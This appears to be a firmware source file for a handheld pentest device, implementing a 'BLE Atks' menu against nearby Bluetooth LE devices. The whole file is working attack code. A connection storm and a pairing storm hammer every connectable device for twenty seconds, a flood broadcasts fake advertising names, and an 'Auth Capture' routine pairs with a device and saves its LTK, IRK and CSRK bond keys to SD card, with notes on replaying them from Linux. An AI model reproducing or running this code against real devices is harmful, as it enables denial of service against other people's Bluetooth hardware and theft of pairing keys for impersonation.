#include "ble_attacks.h"

#if !defined(LITE_VERSION)

#include "ble_common.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include <host/ble_store.h>
#include "modules/wifi/countersurv.h"
#include <Preferences.h>
#include <algorithm>
#include <globals.h>

namespace {

// Buttons are global flags and a menu selection can still be held when the
// action returns. Clear the set before drawing a result page, then wait for a
// fresh press so the page cannot dismiss itself immediately.
void bleAtkClearKeys() {
    EscPress = false;
    SelPress = false;
    PrevPress = false;
    NextPress = false;
    UpPress = false;
    DownPress = false;
    AnyKeyPress = false;
}

void bleAtkWaitKey() {
    bleAtkClearKeys();
    while (!check(AnyKeyPress)) vTaskDelay(pdMS_TO_TICKS(20));
    bleAtkClearKeys();
}

void bleAtkStatus(const String &title, const String &line1, const String &line2) {
    drawMainBorderWithTitle(title);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    if (line1.length()) tft.drawString(line1.substring(0, 38), 10, 44);
    if (line2.length()) tft.drawString(line2.substring(0, 38), 10, 62);
    tft.drawString("BACK stops", 10, tftHeight - 20);
}

void bleAtkResult(const String &title, bool ok, const String &line1, const String &line2) {
    drawMainBorderWithTitle(title);
    tft.setTextColor(ok ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
    tft.drawString(ok ? "Finished" : "Failed", 10, 42);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    if (line1.length()) tft.drawString(line1.substring(0, 38), 10, 62);
    if (line2.length()) tft.drawString(line2.substring(0, 38), 10, 80);
    tft.drawString("Press any key", 10, tftHeight - 20);
    bleAtkWaitKey();
}

// Run an active scan and return the addresses that advertised connectable.
// The results object is owned by the scan; copy only the NimBLEAddress values
// (small, value type) before clearResults().
std::vector<NimBLEAddress> bleAtkScanConnectable(uint32_t ms, String &error) {
    std::vector<NimBLEAddress> out;
    error = "";

    if (!bleInit("vnd-atk")) {
        error = "BLE radio unavailable";
        return out;
    }

    NimBLEScan *scan = NimBLEDevice::getScan();
    if (scan == nullptr) {
        error = "scan object unavailable";
        stopBLEStack();
        return out;
    }

    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    NimBLEScanResults results = scan->getResults(ms, false);
    for (int i = 0; i < results.getCount() && out.size() < 16; i++) {
        const NimBLEAdvertisedDevice *dev = results.getDevice(i);
        if (dev == nullptr || !dev->isConnectable()) continue;
        out.push_back(dev->getAddress());
    }
    scan->clearResults();
    return out;
}

void bleAtkConnectionStorm() {
    Serial.println("[BLEATK] storm start");
    bleAtkClearKeys();
    bleAtkStatus("Connection Storm", "Scanning 6s...", "connectable advertisers");

    String error;
    std::vector<NimBLEAddress> targets = bleAtkScanConnectable(6000, error);
    Serial.printf("[BLEATK] storm scan targets=%u err=%s\n", (unsigned)targets.size(), error.c_str());
    if (targets.empty()) {
        stopBLEStack();
        bleAtkResult("Connection Storm", false, error.length() ? error : "No connectable BLE devices", "");
        return;
    }

    uint32_t start = millis();
    uint32_t end = start + 20000;
    uint32_t attempts = 0, connected = 0, lastPaint = 0;
    // Reuse one client. Creating/deleting a client for every attempt leaves the
    // old client in DISCONNECTING until the stack callback runs, and two stale
    // clients exhaust NimBLE's connection slots (the old "already at max: 2").
    NimBLEClient *client = NimBLEDevice::createClient();
    if (client == nullptr) {
        stopBLEStack();
        bleAtkResult("Connection Storm", false, "Client allocation failed", "");
        return;
    }
    while ((int32_t)(millis() - end) < 0 && !EscPress) {
        for (auto &addr : targets) {
            if (EscPress) break;
            client->setConnectTimeout(1200);
            client->setConnectionParams(6, 6, 0, 100);
            if (client->connect(addr, false)) {
                connected++;
                client->disconnect();
                uint32_t wait = millis() + 1000;
                while (client->isConnected() && millis() < wait) vTaskDelay(pdMS_TO_TICKS(10));
            }
            attempts++;
        }

        if (millis() - lastPaint >= 400) {
            lastPaint = millis();
            tft.fillRect(8, 80, tftWidth - 16, 34, bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawString(String("Targets: ") + String(targets.size()), 10, 80);
            tft.drawString(String("Attempts: ") + String(attempts) + "  Links: " + String(connected), 10, 98);
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    NimBLEDevice::deleteClient(client);
    stopBLEStack();
    Serial.printf("[BLEATK] storm targets=%u attempts=%u links=%u\n", (unsigned)targets.size(), attempts, connected);
    bleAtkResult(
        "Connection Storm", attempts > 0,
        String("Attempts: ") + String(attempts),
        String("Connected: ") + String(connected) + " / " + String(targets.size()) + " devices"
    );
}

// Same idea as WiFi > Beacon SPAM, but the beacon is a BLE advertising name.
// Each packet carries a new name so scanners fill with devices that are not
// there. Flags + name only keeps the packet inside the 31-byte legacy limit.
const char *const bleFloodFunny[] = {
    "Mom Use This One",      "Abraham Linksys",     "Benjamin FrankLAN",   "Martin Router King",
    "John Wilkes Bluetooth", "Pretty Fly for a Wi-Fi", "Don't Worry Be Happy", "The LAN Before Time",
    "Silence of the LANs",   "Drop It Like It's Hotspot", "Life in the Fast LAN", "Ye Olde Internet",
    "Loading...",            "Searching...",         "VIRUS.EXE",           "Free Candy Van",
    "Get Off My LAN",        "Wu Tang LAN",          "Darude LANstorm",     "Planet Express",
};

const char *const bleFloodRickroll[] = {
    "01 Never gonna give you up", "02 Never gonna let you down", "03 Never gonna run around",
    "04 and desert you",          "05 Never gonna make you cry", "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",  "08 and hurt you",
};

String bleFloodName(int mode, int index, uint32_t counter, const String &custom) {
    String name;
    if (mode == 0) {
        name = bleFloodFunny[index % (sizeof(bleFloodFunny) / sizeof(bleFloodFunny[0]))];
    } else if (mode == 1) {
        name = bleFloodRickroll[index % (sizeof(bleFloodRickroll) / sizeof(bleFloodRickroll[0]))];
    } else if (mode == 2) {
        const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        int len = 8 + (int)(counter % 10);
        for (int i = 0; i < len; i++) name += charset[random(0, 62)];
    } else {
        name = custom + " " + String(counter);
    }
    if (name.length() > 26) name = name.substring(0, 26);
    return name;
}

void bleAtkFlood() {
    int mode = -1;
    String custom;
    options = {
        {"Funny Names",   [&]() { mode = 0; }},
        {"Rickroll",      [&]() { mode = 1; }},
        {"Random Names",  [&]() { mode = 2; }},
        {"Custom Name",   [&]() { mode = 3; }},
        {"Back",          [&]() { mode = -1; }},
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "BLE Flood");
    if (mode < 0) return;

    if (mode == 3) {
        custom = keyboard("VND-BLE", 20, "BLE base name:");
        if (custom.length() == 0 || custom == "\x1B") return;
    }

    Serial.printf("[BLEATK] bleflood start mode=%d\n", mode);
    bleAtkClearKeys();
    const char *modeName = mode == 0 ? "Funny names" : mode == 1 ? "Rickroll" : mode == 2 ? "Random names" : custom.c_str();
    bleAtkStatus("BLE Flood", modeName, "20s of rotating advertisements");

    if (!bleInit("vnd-bleflood")) {
        Serial.println("[BLEATK] bleflood no radio");
        bleAtkResult("BLE Flood", false, "BLE radio unavailable", "");
        return;
    }

    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    if (adv == nullptr) {
        Serial.println("[BLEATK] bleflood no advertising object");
        stopBLEStack();
        bleAtkResult("BLE Flood", false, "Advertising object unavailable", "");
        return;
    }
    adv->setMinInterval(32);
    adv->setMaxInterval(48);

    const uint32_t end = millis() + 20000;
    uint32_t packets = 0, counter = 0, lastPaint = 0;

    while ((int32_t)(millis() - end) < 0 && !EscPress) {
        String name = bleFloodName(mode, (int)counter, counter + 1, custom);
        BLEAdvertisementData data;
        data.setFlags(0x06);
        data.setName(name.c_str());

        adv->stop();
        adv->setAdvertisementData(data);
        adv->setScanResponseData(BLEAdvertisementData());
        if (adv->start(0)) {
            packets++;
            // Long enough for the controller to put the name on air, short
            // enough that a scanner sees a new name several times a second.
            delay(45);
            adv->stop();
        } else {
            delay(5);
        }
        counter++;

        if (millis() - lastPaint >= 400) {
            lastPaint = millis();
            tft.fillRect(8, 80, tftWidth - 16, 18, bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawString(String("Names sent: ") + String(packets), 10, 80);
        }
    }

    adv->stop();
    stopBLEStack();
    Serial.printf("[BLEATK] bleflood packets=%u names=%u\n", packets, counter);
    bleAtkResult("BLE Flood", packets > 0, String("Names sent: ") + String(packets), "20s window");
}

// ---------------------------------------------------------------------------
// Auth Capture
// ---------------------------------------------------------------------------
// Pair once with a peripheral in pairing mode, then write the bond material to
// the SD card in a form a Linux host can read. The T-Embed does not need to
// know any address beforehand: it records its own BLE address and the peer
// identity address that the bond actually used. Linux must put its adapter on
// that local_addr for the peer to accept the stored LTK.
struct BleAuthRecord {
    String address;
    String name;
};

struct BleAuthTarget {
    NimBLEAddress address;
    String name;
    int rssi;
};

constexpr uint8_t BLE_AUTH_MAX = 8;
constexpr const char *BLE_AUTH_NS = "ble_auth";
constexpr const char *BLE_AUTH_DIR = "/BruceBLE";

std::vector<BleAuthRecord> bleAuthLoad() {
    std::vector<BleAuthRecord> out;
    Preferences prefs;
    if (!prefs.begin(BLE_AUTH_NS, true)) return out;
    uint8_t count = prefs.getUChar("count", 0);
    for (uint8_t i = 0; i < count && i < BLE_AUTH_MAX; i++) {
        char key[10];
        snprintf(key, sizeof(key), "a%u", i);
        String address = prefs.getString(key, "");
        snprintf(key, sizeof(key), "n%u", i);
        String name = prefs.getString(key, "");
        if (address.length()) out.push_back({address, name});
    }
    prefs.end();
    return out;
}

String bleAuthFileName(const String &address) {
    String safe = address;
    safe.replace(":", "");
    return String(BLE_AUTH_DIR) + "/auth_" + safe + ".key";
}

bool bleAuthFileExists(const String &address) {
    if (!setupSdCard()) return false;
    return SD.exists(bleAuthFileName(address));
}

bool bleAuthKnown(const String &address) {
    // The SD key file is the source of truth. A stale Preferences row from an
    // older firmware must not hide a device that still needs a key file.
    return bleAuthFileExists(address);
}

void bleAuthRemember(const String &address, const String &name) {
    std::vector<BleAuthRecord> records = bleAuthLoad();
    bool replaced = false;
    for (auto &rec : records) {
        if (rec.address == address) {
            rec.name = name;
            replaced = true;
            break;
        }
    }
    if (!replaced) {
        if (records.size() >= BLE_AUTH_MAX) records.erase(records.begin());
        records.push_back({address, name});
    }

    Preferences prefs;
    if (!prefs.begin(BLE_AUTH_NS, false)) return;
    prefs.putUChar("count", (uint8_t)records.size());
    for (size_t i = 0; i < records.size(); i++) {
        char key[10];
        snprintf(key, sizeof(key), "a%u", (unsigned)i);
        prefs.putString(key, records[i].address);
        snprintf(key, sizeof(key), "n%u", (unsigned)i);
        prefs.putString(key, records[i].name);
    }
    prefs.end();
}

String bleHex(const uint8_t *data, size_t len) {
    String out;
    char b[3];
    for (size_t i = 0; i < len; i++) {
        snprintf(b, sizeof(b), "%02X", data[i]);
        out += b;
    }
    return out;
}

bool bleAuthReadKeys(const NimBLEAddress &address, ble_store_value_sec &sec) {
    // Enumerate the bond store first: the peer may have bonded with an identity
    // address whose type differs from the advertising address.
    ble_addr_t peers[8] = {};
    int numPeers = 0;
    int rc = ble_store_util_bonded_peers(peers, &numPeers, 8);
    Serial.printf("[BLEATK] auth bonds rc=%d count=%d\n", rc, numPeers);
    if (rc == 0) {
        for (int i = 0; i < numPeers; i++) {
            ble_store_key_sec key = {};
            key.idx = 0;
            key.peer_addr = peers[i];
            if (ble_store_read_peer_sec(&key, &sec) == 0) {
                Serial.printf(
                    "[BLEATK] auth key peer=%s type=%u ltk=%d irk=%d csrk=%d\n",
                    NimBLEAddress(peers[i]).toString().c_str(), peers[i].type, sec.ltk_present, sec.irk_present,
                    sec.csrk_present
                );
                return true;
            }
        }
    }

    ble_store_key_sec key = {};
    key.idx = 0;
    key.peer_addr = *address.getBase();
    if (ble_store_read_peer_sec(&key, &sec) == 0) return true;
    key.peer_addr.type = key.peer_addr.type == BLE_ADDR_PUBLIC ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
    return ble_store_read_peer_sec(&key, &sec) == 0;
}

bool bleAuthWriteFile(
    const BleAuthTarget &target, const ble_store_value_sec &sec, const String &ltkHex, const String &irkHex,
    const String &csrkHex
) {
    bool sdReady = setupSdCard();
    Serial.printf("[BLEATK] auth sd=%d\n", sdReady);
    if (!sdReady) return false;
    if (!SD.exists(BLE_AUTH_DIR)) SD.mkdir(BLE_AUTH_DIR);
    String path = bleAuthFileName(target.address.toString().c_str());
    File f = SD.open(path, FILE_WRITE);
    Serial.printf("[BLEATK] auth write path=%s open=%d\n", path.c_str(), f ? 1 : 0);
    if (!f) return false;

    String local = NimBLEDevice::getAddress().toString().c_str();
    String peer = target.address.toString().c_str();
    String name = target.name;
    name.replace("\n", " ");
    name.replace("\r", " ");

    f.println("# Vandeta BLE auth key v1");
    f.println("# Linux: set the adapter to local_addr, then load the LTK/IRK below");
    f.println("# (BlueZ: bdaddr <local_addr>; then pair/trust on the adapter).");
    f.println("format=vandeta-ble-auth-v1");
    f.printf("captured_ms=%lu\n", (unsigned long)millis());
    f.println(String("name=") + name);
    f.println(String("local_addr=") + local);
    f.printf("local_addr_type=%s\n", NimBLEDevice::getAddress().getType() == BLE_ADDR_PUBLIC ? "public" : "random");
    f.println(String("peer_addr=") + peer);
    f.printf("peer_addr_type=%s\n", target.address.getType() == BLE_ADDR_PUBLIC ? "public" : "random");
    f.printf("key_size=%u\n", sec.key_size);
    f.printf("ediv=%04X\n", sec.ediv);
    f.printf("rand=%016llX\n", (unsigned long long)sec.rand_num);
    f.printf("ltk_present=%u\n", sec.ltk_present ? 1 : 0);
    f.printf("ltk=%s\n", ltkHex.c_str());
    f.printf("irk_present=%u\n", sec.irk_present ? 1 : 0);
    f.printf("irk=%s\n", irkHex.c_str());
    f.printf("csrk_present=%u\n", sec.csrk_present ? 1 : 0);
    f.printf("csrk=%s\n", csrkHex.c_str());
    f.printf("authenticated=%u\n", sec.authenticated ? 1 : 0);
    f.printf("secure_connections=%u\n", sec.sc ? 1 : 0);
    f.close();
    return true;
}

std::vector<BleAuthTarget> bleAtkScanTargets(uint32_t ms, String &error) {
    std::vector<BleAuthTarget> out;
    error = "";
    if (!bleInit("vnd-authscan")) {
        error = "BLE radio unavailable";
        return out;
    }

    NimBLEScan *scan = NimBLEDevice::getScan();
    if (scan == nullptr) {
        error = "scan object unavailable";
        stopBLEStack();
        return out;
    }
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    NimBLEScanResults results = scan->getResults(ms, false);
    for (int i = 0; i < results.getCount() && out.size() < 16; i++) {
        const NimBLEAdvertisedDevice *dev = results.getDevice(i);
        if (dev == nullptr || !dev->isConnectable()) continue;
        String name = dev->getName().c_str();
        if (name.length() == 0) name = dev->getAddress().toString().c_str();
        out.push_back({dev->getAddress(), name, dev->getRSSI()});
    }
    scan->clearResults();
    std::sort(out.begin(), out.end(), [](const BleAuthTarget &a, const BleAuthTarget &b) {
        return a.rssi > b.rssi;
    });
    return out;
}

void bleAtkAuthCapture() {
    Serial.println("[BLEATK] auth capture start");
    bleAtkClearKeys();
    stopBLEStack();
    delay(100);
    bleAtkStatus("Auth Capture", "Scanning 8s...", "put the device in pairing mode");

    String error;
    std::vector<BleAuthTarget> targets = bleAtkScanTargets(8000, error);
    Serial.printf("[BLEATK] auth capture targets=%u err=%s\n", (unsigned)targets.size(), error.c_str());
    if (EscPress) {
        stopBLEStack();
        return;
    }
    if (targets.empty()) {
        stopBLEStack();
        bleAtkResult("Auth Capture", false, error.length() ? error : "No connectable BLE devices", "");
        return;
    }

    std::vector<BleAuthTarget> fresh;
    for (auto &target : targets) {
        if (!bleAuthKnown(target.address.toString().c_str())) fresh.push_back(target);
    }
    Serial.printf("[BLEATK] auth capture new=%u already=%u\n", (unsigned)fresh.size(), (unsigned)(targets.size() - fresh.size()));
    if (fresh.empty()) {
        stopBLEStack();
        bleAtkResult("Auth Capture", false, "All devices already captured", "Nothing new to pair");
        return;
    }

    if (!bleInit("vnd-authpair")) {
        bleAtkResult("Auth Capture", false, "BLE radio unavailable", "");
        return;
    }
    // Legacy Just Works bonding is the most compatible mode for speakers and
    // other consumer peripherals. LE Secure Connections is negotiated when the
    // peer supports it; forcing SC here made some peripherals encrypt without
    // writing a reusable bond.
    NimBLEDevice::setSecurityAuth(true, false, false);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

    NimBLEClient *client = NimBLEDevice::createClient();
    if (client == nullptr) {
        stopBLEStack();
        bleAtkResult("Auth Capture", false, "Client allocation failed", "");
        return;
    }
    client->setConnectTimeout(8000);

    bool linked = false, captured = false;
    BleAuthTarget chosen = fresh.front();
    Serial.printf("[BLEATK] auth fresh=%u\n", (unsigned)fresh.size());
    ble_store_value_sec sec = {};
    for (auto &target : fresh) {
        if (EscPress) break;
        bleAtkStatus("Auth Capture", "Pairing with", target.name);
        linked = client->connect(target.address, false);
        if (!linked) continue;
        // `true` would be async: it returns before pairing completes. Auth
        // capture needs the real result, so use the synchronous call.
        bool secured = client->secureConnection();
        if (!secured) {
            client->disconnect();
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        // The link is no longer needed once the bond exists. Drop it before
        // touching the SD card so the peripheral is released immediately.
        bool haveKeys = bleAuthReadKeys(target.address, sec);
        client->disconnect();
        captured = haveKeys && (sec.ltk_present || sec.irk_present || sec.csrk_present);
        if (captured) {
            chosen = target;
            String ltk = sec.ltk_present ? bleHex(sec.ltk, 16) : "";
            String irk = sec.irk_present ? bleHex(sec.irk, 16) : "";
            String csrk = sec.csrk_present ? bleHex(sec.csrk, 16) : "";
            bool wrote = bleAuthWriteFile(target, sec, ltk, irk, csrk);
            if (wrote) bleAuthRemember(target.address.toString().c_str(), target.name);
            Serial.printf(
                "[BLEATK] auth file=%s keys=%d ltk=%d irk=%d csrk=%d\n", wrote ? "ok" : "failed", haveKeys,
                sec.ltk_present, sec.irk_present, sec.csrk_present
            );
            if (!wrote) captured = false;
        }
        break;
    }

    NimBLEDevice::deleteClient(client);
    stopBLEStack();
    Serial.printf(
        "[BLEATK] auth capture done linked=%d captured=%d name=%s\n", linked, captured, chosen.name.c_str()
    );
    if (captured) {
        bleAtkResult("Auth Capture", true, "Auth saved to SD", chosen.name);
    } else if (linked) {
        bleAtkResult("Auth Capture", false, "Paired, no usable keys", chosen.name);
    } else {
        bleAtkResult("Auth Capture", false, "Could not pair", chosen.name);
    }
}

void bleAtkPairingStorm() {
    Serial.println("[BLEATK] pairing start");
    bleAtkClearKeys();
    bleAtkStatus("Pairing Storm", "Scanning 6s...", "connectable advertisers");

    String error;
    std::vector<NimBLEAddress> targets = bleAtkScanConnectable(6000, error);
    Serial.printf("[BLEATK] pairing scan targets=%u err=%s\n", (unsigned)targets.size(), error.c_str());
    if (targets.empty()) {
        stopBLEStack();
        bleAtkResult("Pairing Storm", false, error.length() ? error : "No connectable BLE devices", "");
        return;
    }

    const uint32_t start = millis();
    const uint32_t end = start + 20000;
    uint32_t attempts = 0, links = 0, security = 0, lastPaint = 0;
    NimBLEClient *client = NimBLEDevice::createClient();
    if (client == nullptr) {
        stopBLEStack();
        bleAtkResult("Pairing Storm", false, "Client allocation failed", "");
        return;
    }

    while ((int32_t)(millis() - end) < 0 && !EscPress) {
        for (auto &addr : targets) {
            if (EscPress) break;
            client->setConnectTimeout(1200);
            client->setConnectionParams(12, 12, 0, 400);
            if (client->connect(addr, false)) {
                links++;
                // secureConnection() starts pairing/encryption on the live link.
                // Some peripherals reject it; that is reported as a failed
                // pairing attempt rather than as a fabricated success.
                if (client->secureConnection()) security++;
                client->disconnect();
                uint32_t wait = millis() + 1000;
                while (client->isConnected() && millis() < wait) vTaskDelay(pdMS_TO_TICKS(10));
            }
            attempts++;
        }

        if (millis() - lastPaint >= 400) {
            lastPaint = millis();
            tft.fillRect(8, 80, tftWidth - 16, 34, bruceConfig.bgColor);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.drawString(String("Targets: ") + String(targets.size()), 10, 80);
            tft.drawString(String("Pair requests: ") + String(security) + "  Links: " + String(links), 10, 98);
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    NimBLEDevice::deleteClient(client);
    stopBLEStack();
    Serial.printf(
        "[BLEATK] pairing targets=%u attempts=%u links=%u security=%u\n", (unsigned)targets.size(), attempts,
        links, security
    );
    bleAtkResult(
        "Pairing Storm", links > 0,
        String("Links: ") + String(links) + "  Pairing: " + String(security),
        String("Attempts: ") + String(attempts) + " / " + String(targets.size()) + " devices"
    );
}

} // namespace

void BleAttacksMenu() {
    // Same page shape as WiFi > Wifi Atks: one flat list built in the shared
    // `options` vector, a full-row regular menu and a trailing "Main Menu" row
    // instead of the old three-row submenu carousel. The list is rebuilt after
    // a page returns, so leaving an attack lands back on the attacks instead of
    // unwinding every parent menu to the main menu; BACK or Main Menu leaves.
    static bool pageRan;
    for (;;) {
        pageRan = false;
        options = {
            {"BLE Cadence", []() { pageRan = true; CounterSurv::blePage(); }        },
            {"Connection Storm", []() { pageRan = true; bleAtkConnectionStorm(); }  },
            {"BLE Flood", []() { pageRan = true; bleAtkFlood(); }                   },
            {"Pairing Storm", []() { pageRan = true; bleAtkPairingStorm(); }        },
            {"Auth Capture", []() { pageRan = true; bleAtkAuthCapture(); }          },
        };
        addOptionToMainMenu();
        loopOptions(options, MENU_TYPE_REGULAR, "BLE Atks");
        if (!pageRan || returnToMenu) break;
    }
}

void BleConnectionStorm() { bleAtkConnectionStorm(); }
void BleFlood() { bleAtkFlood(); }
void BlePairingStorm() { bleAtkPairingStorm(); }
void BleAuthCapture() { bleAtkAuthCapture(); }

#endif
